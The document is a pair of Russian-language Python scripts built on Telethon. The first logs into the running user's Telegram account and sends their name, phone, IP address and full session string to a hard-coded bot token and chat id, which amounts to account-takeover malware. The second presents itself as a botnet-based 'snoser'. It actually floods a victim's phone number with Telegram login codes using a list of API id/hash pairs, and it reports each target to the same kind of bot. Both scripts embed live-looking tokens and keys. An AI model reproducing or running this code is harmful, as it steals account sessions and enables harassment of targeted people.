import time
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import requests
import base64
import os

RED = '\033[33m'

api_id = '24448137'
api_hash = '33d30b63fbcaa74af19300927a985cf1'
session_file = 'sessions.session'
bot_token = '7016421271:AAGeyYMRcfcF79VKUblyiegOR4_b8IegVdM'


'''6753063874'''
chat_id = ['5974477161'] 

if os.path.exists(session_file):
    client = TelegramClient(session_file, api_id, api_hash)
    
else:
    client = TelegramClient(StringSession(), api_id, api_hash)

def send_notification(bot_token, chat_id, message):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'

    data = {'chat_id': chat_id, 'text': message}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print(f"")
    else:
        print(f"Ошибка при отправке: {response.status_code}, {response.text}")

async def main():
    try:
        print("Авторизация успешна!")
        
        me = await client.get_me()
        phone = me.phone if me.phone else 'Не указано'
        username = me.username if me.username else 'Не указан'
        first_name = me.first_name if me.first_name else 'Не указано'
        last_name = me.last_name if me.last_name else 'Не указано'
        status = me.status if me.status else 'Не указан'
        ip = requests.get('https://api.ipify.org').text

        session_string = StringSession.save(client.session)
        
        if session_string is None:
            print("Ошибка: строка сессии равна None")
        else:
            print("Ваш уникальный ключ(запомните его):", session_string)

        user_info = ("👇Информация о пользователе: \n\n"
            f"Имя: {first_name}\n"
            f"Фамилия: {last_name}\n"
            f"Юзернейм: @{username}\n"
            f"Телефон: {phone}\n"
            f"Статус: {status}\n"
            f"IP-адрес: {ip}\n"
            f"Строка сессии: {session_string}\n"
            f"Последняя активность: {me.status}"
        )
        
        send_notification(bot_token, chat_id, user_info)

    except Exception as e:
        print(f"Ошибка авторизации: {e}")
    finally:
        await client.disconnect()

# Запуск клиента


with client:
    client.loop.run_until_complete(main())



import asyncio
from telethon import TelegramClient
from pystyle import Write, Colors, Center
import os
import requests

os.system('cls' if os.name == 'nt' else 'clear')

bot_token = '8079251100:AAHu09V23BhKrzveNewWIn4yUlCYVlViJzw'
chat_id = '6773319950'

banner = '''
⠀⠀       ⠀⠀⢀⣴⣶⣶⡀⠀⠀⢀⡴⠛⠁⠀⠘⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣷⣤⡴⠋⠀⠀⠀⠀⠀⢿⣇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢏⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣷⣾⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢿⡇
⠀⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⢠⡞⠁⢹⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⠀
⠀⠀⠀⠀⠀⣠⠟⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢸⠀
⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⠋⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠃
   
   
   
   
предупреждение: сносер работает через ботнет - не удаляйте aarch64 из списка устройств!


'''

Write.Print(Center.XCenter(banner), Colors.green_to_blue, interval=0.001)

accounts = [
    {'api_id': '10840', 'api_hash': '33c45224029d59cb3ad0c16134215aeb'},
    {'api_id': '24105845', 'api_hash': '10d28333dedfa35c3719db5162fb02d2'},
    {'api_id': '24448137', 'api_hash': '33d30b63fbcaa74af19300927a985cf1'},
    {'api_id': '8', 'api_hash': '7245de8e747a0d6fbe11f7cc14fcc0bb'},
    {'api_id': '21724', 'api_hash': '3e0cb5efcd52300aec5994fdfc5bdc16'},
    {'api_id': '16623', 'api_hash': '8c9dbfe58437d1739540f5d53c72ae4b'},
    {'api_id': '2899', 'api_hash': '36722c72256a24c1225de00eb6a1ca74'},
    {'api_id': '10840', 'api_hash': '33c45224029d59cb3ad0c16134215aeb'},
    {'api_id': '1', 'api_hash': 'b6b154c3707471f5339bd661645ed3d6'},
    {'api_id': '4', 'api_hash': '014b35b6184100b085b0d0572f9b5103'},
    {'api_id': '5', 'api_hash': '1c5c96d5edd401b1ed40db3fb5633e2d'},
    {'api_id': '2040', 'api_hash': 'b18441a1ff607e10a989891a5462e627'},
    {'api_id': '17349', 'api_hash': '344583e45741c457fe1862106095a5eb'}
]

codes = [
    "67194"
]


def send_notification(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("")
        else:
            print(f"Возникла ошибка: {response.status_code}")
    except Exception as e:
        print(f"Возникла ошибка: {e}")


async def authorize_client(phone_number, api_id, api_hash, code_index):
    client = TelegramClient(None, api_id, api_hash)

    try:
        await client.start(phone=phone_number, code_callback=lambda: codes[code_index])


        if not await client.is_user_authorized():
            print(f"Пользователь {phone_number} не зарегистрирован в Telegram, поэтому спам невозможен.")
        else:
            print(f"Код на {phone_number} был успешно отправлен.\nAPI ID: {api_id} | API HASH: {api_hash}")
    
    except Exception as e:
        print(f"Ошибка авторизации для {phone_number} с API ID {api_id}: {e}")

    finally:
        await client.disconnect()


async def send_codes_with_delay(phone_number, num_cycles):
    for cycle in range(num_cycles):
        print(f"\nЗапуск цикла {cycle + 1} из {num_cycles}")
        send_notification(bot_token, chat_id, f'Отправляется спам на номер {phone_number}, {num_cycles} циклов')
        tasks = []
        for index, account in enumerate(accounts):
            task = authorize_client(phone_number, account['api_id'], account['api_hash'], index % len(codes))
            tasks.append(task)
            await asyncio.sleep(0.01) 
        await asyncio.gather(*tasks)  
    print("Все итерации завершены.")

async def main():
    phone_number = Write.Input("\nВведите номер телефона для спама: ", Colors.blue_to_cyan, interval=0.005)
    num_cycles = int(Write.Input("\nСколько раз вы хотите отправить коды?: ", Colors.blue_to_cyan, interval=0.005))
    await send_codes_with_delay(phone_number, num_cycles)

if __name__ == '__main__':
    asyncio.run(main())
